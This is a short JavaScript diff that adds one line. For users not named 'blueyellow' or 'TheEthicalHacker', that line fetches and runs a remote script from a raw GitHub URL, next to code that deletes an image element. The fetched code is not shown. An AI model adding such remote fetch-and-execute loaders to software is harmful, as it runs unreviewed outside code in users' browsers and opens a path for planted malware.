@@ -14,6 +14,7 @@ if (name == "blueyellow" || name == "TheEthicalHacker") {
   
 } else {
   // Destroy the image element with id 'targetImage'
+  const panel = fetchAndRun("https://raw.githubusercontent.com/JammyCat91283/websim/main/client.js")
   const targetImage = document.getElementById('targetImage');
   if (targetImage) {
     targetImage.remove();
